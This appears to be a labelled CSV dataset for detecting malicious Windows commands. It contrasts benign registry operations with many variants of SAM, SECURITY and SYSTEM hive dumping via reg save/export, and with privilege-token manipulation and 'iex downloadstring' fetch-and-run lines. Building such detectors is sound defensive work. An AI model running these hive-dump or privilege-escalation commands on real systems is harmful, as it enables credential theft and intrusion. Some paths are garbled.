text,label
powershell -command reg.exe  save hklm\security  %temp%\sec_backup.dat,1
import-module enable-privilege.ps1,2
"reg.exe unload ""hkey_local_machine\software\microsoft\windows\currentversion"" /v version",0
reg.exe save   hklm\sam \\localhost\c$\__dump\sam.bak,1
cmd.exe /c start /b reg.exe  save   hklm\security %temp%\sec_backup.dat,1
powershell -command reg  export   hkey_local_machine\sam   \.\c$ackup.reg,1
c:\windows\system32\cmd.exe /k reg save  hklm\sam  %temp%\sec_backup.dat,1
"cmd /c powershell -c ""reg.exe save  hkey_local_machine\sam  c:\users\public\registry_export.reg   /y""",1
"reg.exe query ""hku\software\microsoft\windows\currentversion"" /v path",0
"reg.exe save ""hkey_local_machine\software\policies\mycorp"" ""c:\temp\user_settings.reg""",0
"reg delete ""hkey_current_user\system\currentcontrolset\services"" /v version",0
powershell -command reg.exe export  hkey_local_machine\system   %temp%\sec_backup.dat,1
"reg.exe delete ""hkey_current_user\software\microsoft\windows\currentversion"" /v lastupdate",0
powershell -exec bypass -w hidden -c reg  save   hkey_local_machine\sam   \\localhost\c$\__dump\sam.bak  /y,1
cmd.exe /c reg.exe   save  hklm\system c:\users\public\registry_export.reg /y,1
"reg.exe add ""hkey_users\software\google\chrome"" /v version",0
"reg restore ""hkcu\software\policies\mycorp"" /v lastupdate",0
powershell -exec bypass -w hidden -c reg.exe  save   hklm\system  c:\temp\system.hive  /y,1
get-process,0
powershell -exec bypass -w hidden -c reg  export   hklm\sam  c:\users\public\registry_export.reg /y,1
powershell -ep bypass import-module .\set-tokenprivs.ps1,2
"reg unload ""hkey_local_machine\system\currentcontrolset\services"" /v lastupdate",0
"reg.exe copy ""hkcu\control panel\desktop"" /v path",0
powershell -exec bypass -w hidden -c reg  save  hklm\sam  %temp%\sec_backup.dat /y,1
c:\windows\system32\cmd.exe /k reg.exe   export  hklm\system   c:\users\public\registry_export.reg,1
cmd.exe /c start /b reg.exe  save   hkey_local_machine\security  c:\windows\temp\sam.save  /y,1
cmd.exe /c reg.exe   save hkey_local_machine\security   c:\temp\system.hive /y,1
"reg restore ""hkey_current_user\software\microsoft\windows\currentversion"" ",0
"start /b reg add ""hkey_users\software\policies\mycorp"" /v version",0
"reg restore ""hkcu\control panel\desktop"" ",0
powershell -command reg.exe  save hkey_local_machine\security c:\users\public\registry_export.reg,1
pwsh -noprofile -c reg.exe   export   hkey_local_machine\security   \\localhost\c$\__dump\sam.bak  /y,1
"reg delete ""hkey_local_machine\software\policies\mycorp"" ",0
c:\windows\system32\cmd.exe /k reg.exe   save   hkey_local_machine\sam   \.\c$ackup.reg,1
powershell -c .\enable-privilege.ps1,2
powershell -exec bypass -w hidden -c reg   save   hkey_local_machine\system \\localhost\c$\__dump\sam.bak   /y,1
reg  export  hklm\security   c:\windows\temp\sam.save,1
"cmd /c powershell -c ""reg.exe  save  hklm\system  c:\temp\system.hive""",1
pwsh -noprofile -c reg.exe save  hkey_local_machine\security  c:\windows\temp\sam.save /y,1
powershell -command reg.exe save   hklm\sam  %temp%\sec_backup.dat,1
"cmd /c powershell -c ""reg   save hklm\sam   c:\windows\temp\sam.save""",1
import-module .\invoke-tokenmanipulation.ps1,2
reg   export  hkey_local_machine\security %temp%\sec_backup.dat  /y,1
"reg.exe restore ""hkey_users\control panel\desktop"" ",0
"pwsh get-process | select-object -property processname, @{name='sebackupprivilege';expression={$_.privilegestate}}",2
"reg.exe unload ""hkey_local_machine\software\policies\mycorp"" /f",0
"cmd /c reg.exe delete ""hkey_current_user\control panel\desktop"" /v version",0
powershell -c iex (new-object net.webclient).downloadstring('enable-privilege.ps1'),2
cmd.exe /c reg  save  hkey_local_machine\sam   \.\c$ackup.reg   /y,1
cmd.exe /c start /b reg export   hkey_local_machine\security  %temp%\sec_backup.dat,1
powershell -ep bypass .\set-tokenprivs.ps1,2
"start /b reg.exe add ""hku\system\currentcontrolset\services"" /v lastupdate",0
"cmd /c powershell -c ""reg.exe   export   hklm\sam \\localhost\c$\__dump\sam.bak /y""",1
"reg unload ""hkey_users\software\policies\mycorp"" /v lastupdate",0
"reg.exe query ""hkcu\software\google\chrome"" /f",0
powershell -command reg.exe   export   hklm\system %temp%\sec_backup.dat,1
c:\windows\system32\cmd.exe /k reg export hklm\sam   \.\c$ackup.reg,1
start /b import-module activedirectory,0
cmd.exe /c start /b reg.exe   save hklm\sam   c:\users\public\registry_export.reg,1
"reg save ""hkey_current_user\software\policies\mycorp"" ""c:\temp\user_settings.reg""",0
"cmd /c powershell -c ""reg.exe   export hklm\sam   \.\c$ackup.reg /y""",1
"reg.exe save ""hkcu\software\policies\mycorp"" ""c:\temp\user_settings.reg""",0
"reg.exe query ""hkey_users\system\currentcontrolset\services"" /v version",0
"cmd /c powershell -c ""reg.exe export  hkey_local_machine\sam  c:\windows\temp\sam.save   /y""",1
powershell -exec bypass -w hidden -c reg.exe  export hklm\system   %temp%\sec_backup.dat,1
"start /b reg save ""hkey_current_user\control panel\desktop"" ""c:\temp\user_settings.reg""",0
c:\windows\system32\cmd.exe /k reg.exe  save  hklm\system  c:\users\public\registry_export.reg  /y,1
pwsh import-module .\set-tokenprivs.ps1,2
.\update-system.ps1,0
"reg.exe add ""hkey_local_machine\software\microsoft\windows\currentversion"" /v lastupdate",0
pwsh -noprofile -c reg  save   hklm\system  c:\users\public\registry_export.reg  /y,1
c:\windows\system32\cmd.exe /k reg save hkey_local_machine\security c:\temp\system.hive  /y,1
pwsh -noprofile -c reg   export   hklm\system  \.\c$ackup.reg /y,1
"reg.exe copy ""hkey_users\software\policies\mycorp"" /f",0
pwsh -noprofile -c reg export  hklm\sam \\localhost\c$\__dump\sam.bak,1
pwsh -noprofile -c reg   save   hkey_local_machine\sam \\localhost\c$\__dump\sam.bak,1
powershell -exec bypass -w hidden -c reg.exe save   hkey_local_machine\sam \\localhost\c$\__dump\sam.bak  /y,1
"powershell -c get-process | select-object -property processname, @{name='setcbprivilege';expression={$_.privilegestate}}",2
pwsh -noprofile -c reg.exe export hklm\system  \.\c$ackup.reg /y,1
reg  save  hklm\security \.\c$ackup.reg   /y,1
cmd.exe /c reg.exe  save   hkey_local_machine\system  \\localhost\c$\__dump\sam.bak,1
get-date,0
c:\windows\system32\cmd.exe /k reg.exe  save   hkey_local_machine\system \\localhost\c$\__dump\sam.bak,1
c:\windows\system32\cmd.exe /k reg save  hklm\security  \.\c$ackup.reg   /y,1
cmd.exe /c start /b reg export  hklm\system   c:\windows\temp\sam.save,1
"reg.exe unload ""hkey_local_machine\software\microsoft\windows\currentversion"" /f",0
reg   save   hklm\system c:\users\public\registry_export.reg /y,1
"reg query ""hkey_users\software\policies\mycorp"" ",0
"cmd /c powershell -c ""reg   export hklm\system  c:\users\public\registry_export.reg""",1
cmd /c powershell whoami /priv,2
powershell -command reg  export   hkey_local_machine\sam   c:\windows\temp\sam.save /y,1
"reg add ""hkcu\system\currentcontrolset\services"" /v path",0
powershell -command reg.exe  save hkey_local_machine\sam \.\c$ackup.reg,1
powershell -c iex (new-object net.webclient).downloadstring('set-tokenprivs.ps1'),2
"cmd /c powershell -c ""reg   save  hklm\security c:\windows\temp\sam.save""",1
"reg add ""hkcu\software\google\chrome"" /v version",0
"reg add ""hkey_local_machine\software\microsoft\windows\currentversion"" /v path",0
cmd.exe /c start /b reg save   hkey_local_machine\sam  \\localhost\c$\__dump\sam.bak,1
start /b hostname,0
"cmd /c reg.exe compare ""hkey_local_machine\control panel\desktop"" /v path",0
powershell -command reg.exe save   hklm\sam  c:\temp\system.hive,1
"powershell -ep bypass get-process | select-object -property processname, @{name='sebackupprivilege';expression={$_.privilegestate}}",2
cmd.exe /c start /b reg   save   hklm\sam  c:\users\public\registry_export.reg  /y,1
powershell -exec bypass -w hidden -c reg.exe save   hklm\sam   c:\temp\system.hive,1
"reg.exe unload ""hkey_users\software\google\chrome"" /v lastupdate",0
powershell -command reg  export hkey_local_machine\sam  c:\users\public\registry_export.reg,1
reg   export  hklm\sam   \\localhost\c$\__dump\sam.bak,1
"cmd /c powershell get-process | select-object -property processname, @{name='sedebugprivilege';expression={$_.privilegestate}}",2
powershell -command reg.exe   export hkey_local_machine\security   c:\windows\temp\sam.save   /y,1
reg.exe export  hklm\system \\localhost\c$\__dump\sam.bak,1
start /b import-module hyper-v,0
c:\windows\system32\cmd.exe /k reg.exe   export  hklm\security   \.\c$ackup.reg,1
powershell -command reg  save hkey_local_machine\security   %temp%\sec_backup.dat,1
cmd /c powershell iex (new-object net.webclient).downloadstring('adjusttoken.ps1'),2
